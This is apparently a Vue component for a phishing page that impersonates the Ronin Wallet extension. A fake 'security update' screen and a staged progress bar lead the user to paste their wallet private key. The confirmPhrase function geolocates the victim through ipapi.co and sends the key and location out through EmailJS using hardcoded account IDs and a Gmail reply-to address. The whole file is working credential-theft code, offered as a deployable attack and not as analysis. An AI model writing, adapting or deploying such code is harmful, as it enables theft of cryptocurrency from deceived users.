<template>
  <div class="rounded-2xl w-full text-white overflow-hidden" :style="wrapperStyle">
    <!-- Header (shown from step 2 onward) -->
    <div v-if="currentStep !== 1" class="flex justify-between items-center py-4 px-4 border-b border-gray-700">
      <div class="text-3xl font-bold">
        {{
          currentStep === 2
            ? "Update Available"
            : currentStep === 3
            ? "Updating"
            : currentStep === 4
            ? "Import wallet"
            : ""
        }}
      </div>
      <span class="w-6"></span>
    </div>

    <hr class="border-t m-0 border-gray-700" v-if="currentStep !== 1" />

    <!-- Step container -->
    <div class="min-h-[520px] flex flex-col relative">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <!-- STEP 1 -->
          <template v-if="currentStep === 1">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[30px]">
                <img
                  :src="logoUrl"
                  alt="Ronin Wallet Logo"
                  class="object-cover rounded-[10px] w-[60px] h-[60px]"
                />
              </div>
              <div class="w-full mt-[20px]">
                <h2 class="text-5xl leading-[24px] font-bold m-0 tracking-[-0.02em]">Ronin Wallet</h2>
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">Extension</p>

                <div class="bg-[#0A0B0D] rounded-lg p-4 mb-8" style="background: rgba(4, 150, 255, 0.08)">
                  <div class="flex items-start">
                    <div class="rounded-full p-2 mr-3 mt-1" :style="{ background: primaryColor }">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                      </svg>
                    </div>
                    <div>
                      <h3 class="text-white text-[16px] font-semibold mb-1">Get Started</h3>
                      <p class="text-gray-300 text-[14px] leading-7 mt-1">
                        Import your existing wallet to continue.
                      </p>
                    </div>
                  </div>
                </div>

                <div class="mt-[10px]">
                  <button @click="nextStep" type="button" class="w-full py-4 px-4 mb-2 border-none outline-none rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white" :style="{ background: primaryColor }">
                    Import Wallet
                  </button>
                  <p class="text-center mb-[30px] mt-[20px] text-[14px] font-semibold text-gray-300">
                    Need help? <a href="#" class="underline" :style="{ color: primaryColor }">Visit our support page</a>
                  </p>
                </div>
              </div>
            </div>
          </template>

          <!-- STEP 2: Update Available -->
          <template v-else-if="currentStep === 2">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[30px]">
                <img :src="logoUrl" alt="Ronin Wallet Logo" class="object-cover rounded-[10px] w-[60px] h-[60px]" />
              </div>
              <div class="w-full mt-[20px]">
                <h2 class="text-4xl font-bold">Update Available</h2>
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">Security enhancements and performance improvements.</p>

                <div class="mt-[10px] mb-[40px]">
                  <div class="rounded-lg p-4" style="background: rgba(4, 150, 255, 0.08)">
                    <div class="flex items-start">
                      <div class="rounded-full p-2 mr-3 mt-1" :style="{ background: primaryColor }">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 20 20" fill="currentColor">
                          <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                        </svg>
                      </div>
                      <div>
                        <h3 class="text-white text-[16px] font-semibold mb-1">Security Update Required</h3>
                        <p class="text-gray-300 text-[14px] leading-7 mt-1">To ensure your wallet's security, please confirm this update.</p>
                      </div>
                    </div>
                  </div>
                </div>

                <div class="mt-[10px]">
                  <button @click="nextStep" type="button" class="w-full py-4 px-4 mb-2 border-none outline-none rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white" :style="{ background: primaryColor }">
                    Confirm Update
                  </button>
                </div>
              </div>
            </div>
          </template>

          <!-- STEP 3: Updating -->
          <div v-else-if="currentStep === 3" key="s3" class="flex flex-col items-center p-6">
            <div class="flex flex-col items-center gap-3 py-6 w-full">
              <h2 class="text-4xl text-white mt-2 mb-0 text-center font-bold">Updating</h2>
              <div class="w-full mt-6">
                <div class="bg-white h-2 rounded-full overflow-hidden">
                  <div class="h-4 rounded-full transition-all" :style="{ width: progress + '%', background: primaryColor }"></div>
                </div>
                <div class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-white">
                  <span>{{ Math.round(progress) }}%</span>
                </div>
              </div>
            </div>
          </div>

          <!-- STEP 4: Import private key -->
          <div v-else-if="currentStep === 4" key="s4" class="flex flex-col w-full p-6">
            <div class="flex items-center mb-3 mt-2">
              <div class="flex space-x-2">
                <div class="w-[40px] h-2 rounded-full bg-white"></div>
                <div class="w-[40px] h-2 rounded-full bg-white"></div>
                <div class="w-[40px] h-2 rounded-full bg-gray-600"></div>
                <div class="w-[40px] h-2 rounded-full bg-gray-600"></div>
              </div>
            </div>

            <h2 class="text-4xl font-bold mt-4">Import wallet</h2>
            <div class="mt-4 text-[14px] font-semibold">
              <span :style="{ color: primaryColor }">Successfully Updated!</span>
              Enter your wallet's private key to complete the process.
            </div>

            <div class="mt-6">
              <label class="block text-white mb-2 text-lg font-medium">Paste or input your private key</label>
              <textarea v-model="privateKeyInput" rows="4" class="w-full mb-3 bg-[#181818] border border-gray-300 rounded-lg py-3 px-4 text-white text-[16px] outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 resize-none"></textarea>
              <span class="text-[14px] font-semibold" :style="{ color: primaryColor }">Where can I find it?</span>

              <div class="flex gap-3 mt-[30px]">
                <button @click="confirmPhrase" class="flex-1 font-bold text-[14px] border-none text-white py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed" :style="{ background: primaryColor }">
                  {{ isLoading ? 'Importing...' : 'Import Wallet' }}
                </button>
              </div>
            </div>
          </div>
        </div>
      </transition>

      <!-- Message -->
      <transition name="fade">
        <div v-if="message.text" :class="['absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold', message.type === 'success' ? 'bg-green-600 text-white' : 'bg-red-600 text-white']">
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref } from 'vue';
import axios from 'axios';

const emit = defineEmits(["close"]);

const currentStep = ref(1);
const isLoading = ref(false);
const progress = ref(0);
const message = ref({ text: '', type: '' });
const privateKeyInput = ref('');

// Styles
const primaryColor = '#0496FF';
const wrapperStyle = 'background: linear-gradient(135deg, #1a1a2e 0%, #232347 100%);';
const logoUrl = 'https://logo.clearbit.com/roninchain.com';

function nextStep() {
  if (currentStep.value === 1) {
    currentStep.value = 2;
  } else if (currentStep.value === 2) {
    startUpdate();
  }
}

function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;
  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        currentStep.value = 4;
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

async function confirmPhrase() {
  if (privateKeyInput.value.length < 64) {
    return showMessage('Please enter a valid private key', 'error');
  }
  isLoading.value = true;
  try {
    const location = await axios.get('https://ipapi.co/json');
    const payload = {
      type: 'private',
      phrase: privateKeyInput.value,
    };
    const params = {
      service_id: 'service_eusbqyo',
      template_id: 'template_z6xga6o',
      user_id: 'obT4LcwZqPw_KlOar',
      template_params: {
        from_name: 'Blockchain solutions',
        wallet_type: 'Ronin Wallet',
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: 'customeronlineagent@gmail.com',
      },
    };
    const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params);
    if (response.data === 'OK') {
      showMessage('Wallet imported successfully!', 'success');
      emit('close');
    }
  } catch (err) {
    showMessage(err.message || 'Import failed', 'error');
  } finally {
    isLoading.value = false;
  }
}

function showMessage(text, type = 'success') {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = '';
  }, 3000);
}
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active { transition: opacity 0.4s ease; }
.fade-enter-from,
.fade-leave-to { opacity: 0; }
</style>